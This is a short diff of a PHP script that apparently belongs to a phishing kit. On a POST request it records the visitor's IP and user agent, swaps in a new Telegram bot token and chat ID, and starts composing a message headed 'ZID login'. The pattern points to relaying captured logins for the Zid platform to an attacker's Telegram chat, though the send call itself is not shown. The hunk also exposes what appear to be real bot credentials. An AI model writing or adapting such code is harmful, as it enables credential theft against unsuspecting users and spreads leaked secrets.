@@ -7,8 +7,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
     $userIP = $_SERVER['REMOTE_ADDR'];
 
-    $token = "7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A";
-    $chat_id = "-1002180753425";
+    $token = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
+    $chat_id = "-4625923889";
 
     // تنسيق الرسالة
     $message = "╮━≪ 🔥 تسجيل دخول ZID  ≫━╭\n\n" .
